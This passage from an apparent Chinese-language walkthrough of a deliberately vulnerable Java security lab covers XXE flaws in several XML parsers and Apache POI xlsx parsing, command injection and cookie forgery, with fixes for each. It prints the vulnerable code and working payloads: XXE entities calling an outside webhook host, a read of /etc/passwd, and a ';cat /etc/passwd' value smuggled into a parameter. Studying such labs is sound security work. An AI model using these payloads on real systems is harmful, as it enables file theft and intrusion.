<h4 id="4-xxe-SAXParser-vuln"><a href="#4-xxe-SAXParser-vuln" class="headerlink" title="4.&#x2F;xxe&#x2F;SAXParser&#x2F;vuln"></a>4.&#x2F;xxe&#x2F;SAXParser&#x2F;vuln</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value = &quot;/SAXParser/vuln&quot;, method = RequestMethod.POST)</span><br><span class="line">  public String SAXParserVuln(HttpServletRequest request) &#123;</span><br><span class="line">      try &#123;</span><br><span class="line">          String body = WebUtils.getRequestBody(request);</span><br><span class="line">          logger.info(body);</span><br><span class="line"></span><br><span class="line">          SAXParserFactory spf = SAXParserFactory.newInstance();</span><br><span class="line">          SAXParser parser = spf.newSAXParser();</span><br><span class="line">          parser.parse(new InputSource(new StringReader(body)), new DefaultHandler());  // parse xml</span><br><span class="line"></span><br><span class="line">          return &quot;SAXParser xxe vuln code&quot;;</span><br><span class="line">      &#125; catch (Exception e) &#123;</span><br><span class="line">          logger.error(e.toString());</span><br><span class="line">          return EXCEPT;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="5-xxe-Digester-vuln"><a href="#5-xxe-Digester-vuln" class="headerlink" title="5.&#x2F;xxe&#x2F;Digester&#x2F;vuln"></a>5.&#x2F;xxe&#x2F;Digester&#x2F;vuln</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value = &quot;/Digester/vuln&quot;, method = RequestMethod.POST)</span><br><span class="line">    public String DigesterVuln(HttpServletRequest request) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            Digester digester = new Digester();</span><br><span class="line">            digester.parse(new StringReader(body));  // parse xml</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;Digester xxe vuln code&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="6-xxe-DocumentBuilder-vuln"><a href="#6-xxe-DocumentBuilder-vuln" class="headerlink" title="6.&#x2F;xxe&#x2F;DocumentBuilder&#x2F;vuln"></a>6.&#x2F;xxe&#x2F;DocumentBuilder&#x2F;vuln</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value = &quot;/DocumentBuilder/vuln&quot;, method = RequestMethod.POST)</span><br><span class="line">    public String DocumentBuilderVuln(HttpServletRequest request) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            InputSource is = new InputSource(request.getInputStream());</span><br><span class="line">            Document document = db.parse(is);  // parse xml</span><br><span class="line"></span><br><span class="line">            // 遍历xml节点name和value</span><br><span class="line">            StringBuilder buf = new StringBuilder();</span><br><span class="line">            NodeList rootNodeList = document.getChildNodes();</span><br><span class="line">            for (int i = 0; i &lt; rootNodeList.getLength(); i++) &#123;</span><br><span class="line">                Node rootNode = rootNodeList.item(i);</span><br><span class="line">                NodeList child = rootNode.getChildNodes();</span><br><span class="line">                for (int j = 0; j &lt; child.getLength(); j++) &#123;</span><br><span class="line">                    Node node = child.item(j);</span><br><span class="line">                    buf.append(String.format(&quot;%s: %s\n&quot;, node.getNodeName(), node.getTextContent()));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            return buf.toString();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return e.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这是JDK自带的类，以此产生的XXE是存在回显的</p>
<h4 id="7-xxe-DocumentBuilder-xinclude-vuln"><a href="#7-xxe-DocumentBuilder-xinclude-vuln" class="headerlink" title="7.&#x2F;xxe&#x2F;DocumentBuilder&#x2F;xinclude&#x2F;vuln"></a>7.&#x2F;xxe&#x2F;DocumentBuilder&#x2F;xinclude&#x2F;vuln</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value = &quot;/DocumentBuilder/xinclude/vuln&quot;, method = RequestMethod.POST)</span><br><span class="line">    public String DocumentBuilderXincludeVuln(HttpServletRequest request) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            dbf.setXIncludeAware(true);   // 支持XInclude</span><br><span class="line">            dbf.setNamespaceAware(true);  // 支持XInclude</span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            StringReader sr = new StringReader(body);</span><br><span class="line">            InputSource is = new InputSource(sr);</span><br><span class="line">            Document document = db.parse(is);  // parse xml</span><br><span class="line"></span><br><span class="line">            NodeList rootNodeList = document.getChildNodes();</span><br><span class="line">            response(rootNodeList);</span><br><span class="line"></span><br><span class="line">            sr.close();</span><br><span class="line">            return &quot;DocumentBuilder xinclude xxe vuln code&quot;;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="8-xxe-XMLReader-vuln"><a href="#8-xxe-XMLReader-vuln" class="headerlink" title="8.&#x2F;xxe&#x2F;XMLReader&#x2F;vuln"></a>8.&#x2F;xxe&#x2F;XMLReader&#x2F;vuln</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">@PostMapping(&quot;/XMLReader/vuln&quot;)</span><br><span class="line">    public String XMLReaderVuln(HttpServletRequest request) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            SAXParserFactory spf = SAXParserFactory.newInstance();</span><br><span class="line">            SAXParser saxParser = spf.newSAXParser();</span><br><span class="line">            XMLReader xmlReader = saxParser.getXMLReader();</span><br><span class="line">            xmlReader.parse(new InputSource(new StringReader(body)));</span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return &quot;XMLReader xxe vuln code&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="9-xxe-DocumentHelper-vuln"><a href="#9-xxe-DocumentHelper-vuln" class="headerlink" title="9.&#x2F;xxe&#x2F;DocumentHelper&#x2F;vuln"></a>9.&#x2F;xxe&#x2F;DocumentHelper&#x2F;vuln</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">@PostMapping(&quot;/DocumentHelper/vuln&quot;)</span><br><span class="line">    public String DocumentHelper(HttpServletRequest req) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(req);</span><br><span class="line">            DocumentHelper.parseText(body); // parse xml</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return &quot;DocumentHelper xxe vuln code&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    private static void response(NodeList rootNodeList)&#123;</span><br><span class="line">        for (int i = 0; i &lt; rootNodeList.getLength(); i++) &#123;</span><br><span class="line">            Node rootNode = rootNodeList.item(i);</span><br><span class="line">            NodeList xxe = rootNode.getChildNodes();</span><br><span class="line">            for (int j = 0; j &lt; xxe.getLength(); j++) &#123;</span><br><span class="line">                Node xxeNode = xxe.item(j);</span><br><span class="line">                // 测试不能blind xxe，所以强行加了一个回显</span><br><span class="line">                logger.info(&quot;xxeNode: &quot; + xxeNode.getNodeValue());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>修复该漏洞只需升级dom4j到2.1.1及以上，该版本及以上禁用了ENTITY；不带ENTITY的PoC不能利用，所以禁用ENTITY即可完成修复。</p>
<h4 id="上述存在XXE漏洞库对比"><a href="#上述存在XXE漏洞库对比" class="headerlink" title="上述存在XXE漏洞库对比"></a>上述存在XXE漏洞库对比</h4><table>
<thead>
<tr>
<th align="left"><strong>工具&#x2F;类</strong></th>
<th align="left"><strong>简介</strong></th>
<th align="left"><strong>使用场景</strong></th>
<th align="left"><strong>优点</strong></th>
<th align="left"><strong>缺点</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>xmlReader</code></td>
<td align="left">SAX 的接口，基于事件驱动的解析</td>
<td align="left">处理大型 XML 文件</td>
<td align="left">内存占用小，速度快</td>
<td align="left">需要手动管理上下文，处理复杂结构困</td>
</tr>
<tr>
<td align="left"><code>SAXBuilder</code></td>
<td align="left">JDOM 中基于 SAX 的解析器</td>
<td align="left">需要用 JDOM 处理 XML 数据时</td>
<td align="left">结合了 SAX 的高效性和 JDOM 的易用性</td>
<td align="left">解析速度依赖于 SAX，灵活性低于 DOM</td>
</tr>
<tr>
<td align="left">SAXReader&#96;</td>
<td align="left">Dom4j 中基于 SAX 的解析器</td>
<td align="left">需要 Dom4j 进行 XML 操作时</td>
<td align="left">高效且灵活，支持树结构</td>
<td align="left">性能略逊于纯 SAX</td>
</tr>
<tr>
<td align="left"><code>SAXParser</code></td>
<td align="left">Java 中的 SAX 解析器</td>
<td align="left">基于事件驱动的解析，适合处理大型 XML 文件</td>
<td align="left">高效，内存占用小</td>
<td align="left">解析复杂 XML 需要手动处理回调</td>
</tr>
<tr>
<td align="left">Digester&#96;</td>
<td align="left">基于 SAX，将 XML 映射到 Java 对象（Apache Commons 提供）</td>
<td align="left">需要将 XML 映射为 Java 对象时</td>
<td align="left">简化 XML 与 Java 对象的映射</td>
<td align="left">对大文件不友好，灵活性较低</td>
</tr>
<tr>
<td align="left">DocumentBuilder&#96;</td>
<td align="left">Java 中 DOM 解析器，用于构建树状结构</td>
<td align="left">需要完整树结构操作，如修改和多次遍历 XML 文件</td>
<td align="left">完整保留文档结构，易于查找和修改</td>
<td align="left">内存占用较大，处理大文件时性能较差</td>
</tr>
<tr>
<td align="left"><code>DocumentHelper</code></td>
<td align="left">Dom4j 提供的辅助类，用于快速创建和操作 XML 文档</td>
<td align="left">需要手动构建和操作 XML 文档时</td>
<td align="left">快速创建和处理 XML 文档，灵活性高</td>
<td align="left">内存占用较大，处理超大文件时性能不佳</td>
</tr>
</tbody></table>
<h4 id="统一漏洞利用payload"><a href="#统一漏洞利用payload" class="headerlink" title="统一漏洞利用payload"></a>统一漏洞利用payload</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &quot;	http://webhook.site/186f2ce9-cf0c-4eda-ad3f-49c3873814a7&quot;&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281127895.png" alt="image-20250728112724781" loading="lazy"></p>
<h4 id="统一修复代码"><a href="#统一修复代码" class="headerlink" title="统一修复代码"></a>统一修复代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//实例化解析类之后通常会支持着三个配置</span><br><span class="line">obj.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class="line">obj.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">obj.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>禁用了外部实体，限制实体来源。</p>
<h4 id="10-xxe-xmlbeam-vuln"><a href="#10-xxe-xmlbeam-vuln" class="headerlink" title="10.&#x2F;xxe&#x2F;xmlbeam&#x2F;vuln"></a>10.&#x2F;xxe&#x2F;xmlbeam&#x2F;vuln</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">@PostMapping(value = &quot;/xmlbeam/vuln&quot;)</span><br><span class="line">HttpEntity&lt;String&gt; post(@RequestBody UserPayload user) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        logger.info(user.toString());</span><br><span class="line">        return ResponseEntity.ok(String.format(&quot;hello, %s!&quot;, user.getUserName()));</span><br><span class="line">    &#125;catch (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        return ResponseEntity.ok(&quot;error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * The projection interface using XPath and JSON Path expression to selectively pick elements from the payload.</span><br><span class="line"> */</span><br><span class="line">@ProjectedPayload</span><br><span class="line">public interface UserPayload &#123;</span><br><span class="line">    @XBRead(&quot;//userName&quot;)</span><br><span class="line">    String getUserName();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>该代码需要使用固定的标签可以实现回显，我们可以构造payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [  </span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;  </span><br><span class="line">]&gt;</span><br><span class="line">&lt;userPayload&gt;</span><br><span class="line">    &lt;userName&gt;&amp;xxe;&lt;/userName&gt;</span><br><span class="line">&lt;/userPayload&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281443153.png" alt="image-20250728144316073" loading="lazy"></p>
<h4 id="11-ooxml-readxlsx"><a href="#11-ooxml-readxlsx" class="headerlink" title="11&#x2F;ooxml&#x2F;readxlsx"></a>11&#x2F;ooxml&#x2F;readxlsx</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">@PostMapping(&quot;/readxlsx&quot;)</span><br><span class="line">   @ResponseBody</span><br><span class="line">   public String ooxml_xxe(MultipartFile file) throws IOException &#123;</span><br><span class="line">       XSSFWorkbook wb = new XSSFWorkbook(file.getInputStream()); // xxe vuln</span><br><span class="line"></span><br><span class="line">       XSSFSheet sheet = wb.getSheetAt(0);</span><br><span class="line">       XSSFRow row;</span><br><span class="line">       XSSFCell cell;</span><br><span class="line"></span><br><span class="line">       Iterator rows = sheet.rowIterator();</span><br><span class="line">       StringBuilder sbResult = new StringBuilder();</span><br><span class="line"></span><br><span class="line">       while (rows.hasNext()) &#123;</span><br><span class="line"></span><br><span class="line">           row = (XSSFRow) rows.next();</span><br><span class="line">           Iterator cells = row.cellIterator();</span><br><span class="line"></span><br><span class="line">           while (cells.hasNext()) &#123;</span><br><span class="line">               cell = (XSSFCell) cells.next();</span><br><span class="line"></span><br><span class="line">               if (cell.getCellType() == XSSFCell.CELL_TYPE_STRING) &#123;</span><br><span class="line">                   sbResult.append(cell.getStringCellValue()).append(&quot; &quot;);</span><br><span class="line">               &#125; else if (cell.getCellType() == XSSFCell.CELL_TYPE_NUMERIC) &#123;</span><br><span class="line">                   sbResult.append(cell.getNumericCellValue()).append(&quot; &quot;);</span><br><span class="line">               &#125; else &#123;</span><br><span class="line">                   logger.info(&quot;errors&quot;);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       return sbResult.toString();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>查看源码得知使用的是poi-ooxml组件（ Apache POI是提供Microsoft Office系列文档读、写功能的 JAVA 类库）进行xlsx文件操作，在3.10版本及以下存在XXE注入漏洞，3.15以下版本存在Dos漏洞，这里使用的是3.9版本。</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281145386.png" alt="image-20250728114555336" loading="lazy"></p>
<p>我们新建一个1.xlsx，用7-zip打开这个文件的压缩包</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281417899.png" alt="image-20250728141719633" loading="lazy"></p>
<p>然后修改[Content_Types].xml文件，在最上面添加</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ELEMENT foo ANY&gt;</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;	http://webhook.site/186f2ce9-cf0c-4eda-ad3f-49c3873814a7&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;test&gt;&amp;xxe;&lt;/test&gt;</span><br></pre></td></tr></table></figure>

<p>在upload路由下上传这个1.xlsx，我们在webhook能发现这个文件执行成功了</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281418084.png" alt="image-20250728141829969" loading="lazy"></p>
<h4 id="12-xlsx-streamer-readxlsx"><a href="#12-xlsx-streamer-readxlsx" class="headerlink" title="12.&#x2F;xlsx-streamer&#x2F;readxlsx"></a>12.&#x2F;xlsx-streamer&#x2F;readxlsx</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@PostMapping(&quot;/readxlsx&quot;)</span><br><span class="line">   public void xllx_streamer_xxe(MultipartFile file) throws IOException &#123;</span><br><span class="line">       StreamingReader.builder().open(file.getInputStream());</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>和上题相比就是换了个库的区别，payload一样的</p>
<h3 id="Commandinject"><a href="#Commandinject" class="headerlink" title="Commandinject"></a>Commandinject</h3><h4 id="1-codeinject"><a href="#1-codeinject" class="headerlink" title="1.&#x2F;codeinject"></a>1.&#x2F;codeinject</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/codeinject&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">codeInject</span><span class="params">(String filepath)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">    String[] cmdList = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;ls -la &quot;</span> + filepath&#125;;</span><br><span class="line">    <span class="type">ProcessBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmdList);</span><br><span class="line">    builder.redirectErrorStream(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> builder.start();</span><br><span class="line">    <span class="keyword">return</span> WebUtils.convertStreamToString(process.getInputStream());</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将传入的参数直接与原命令拼接，实现命令注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filepath=;cat /etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281439849.png" alt="image-20250728143906716" loading="lazy"></p>
<h4 id="2-codeinject-host"><a href="#2-codeinject-host" class="headerlink" title="2.&#x2F;codeinject&#x2F;host"></a>2.&#x2F;codeinject&#x2F;host</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;/codeinject/host&quot;)</span><br><span class="line">    public String codeInjectHost(HttpServletRequest request) throws IOException &#123;</span><br><span class="line"></span><br><span class="line">        String host = request.getHeader(&quot;host&quot;);</span><br><span class="line">        logger.info(host);</span><br><span class="line">        String[] cmdList = new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;curl &quot; + host&#125;;</span><br><span class="line">        ProcessBuilder builder = new ProcessBuilder(cmdList);</span><br><span class="line">        builder.redirectErrorStream(true);</span><br><span class="line">        Process process = builder.start();</span><br><span class="line">        return WebUtils.convertStreamToString(process.getInputStream());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>同样可以使用命令拼接，但需要再host字段处进行传参（不知道为啥我传不上去，用大佬的图片代替一下）</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281459171.png" alt="image-20250728145951030" loading="lazy"></p>
<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>修复代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;/codeinject/sec&quot;)</span><br><span class="line">public String codeInjectSec(String filepath) throws IOException &#123;</span><br><span class="line">    String filterFilePath = SecurityUtil.cmdFilter(filepath);</span><br><span class="line">    if (null == filterFilePath) &#123;</span><br><span class="line">        return &quot;Bad boy. I got u.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    String[] cmdList = new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls -la &quot; + filterFilePath&#125;;</span><br><span class="line">    ProcessBuilder builder = new ProcessBuilder(cmdList);</span><br><span class="line">    builder.redirectErrorStream(true);</span><br><span class="line">    Process process = builder.start();</span><br><span class="line">    return WebUtils.convertStreamToString(process.getInputStream());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>cmdFilter函数代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">private static final Pattern FILTER_PATTERN = Pattern.compile(&quot;^[a-zA-Z0-9_/\\.-]+$&quot;);</span><br><span class="line">   public static String cmdFilter(String input) &#123;</span><br><span class="line">        if (!FILTER_PATTERN.matcher(input).matches()) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return input;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>限制了参数中的字符，防止命令注入。</p>
<h3 id="Cookie伪造"><a href="#Cookie伪造" class="headerlink" title="Cookie伪造"></a>Cookie伪造</h3><h4 id="1-cookie-vuln01"><a href="#1-cookie-vuln01" class="headerlink" title="1.&#x2F;cookie&#x2F;vuln01"></a>1.&#x2F;cookie&#x2F;vuln01</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">private static String NICK = &quot;nick&quot;;</span><br><span class="line"></span><br><span class="line">@GetMapping(value = &quot;/vuln01&quot;)</span><br><span class="line">public String vuln01(HttpServletRequest req) &#123;</span><br><span class="line">    String nick = WebUtils.getCookieValueByName(req, NICK); // key code</span><br><span class="line">    return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

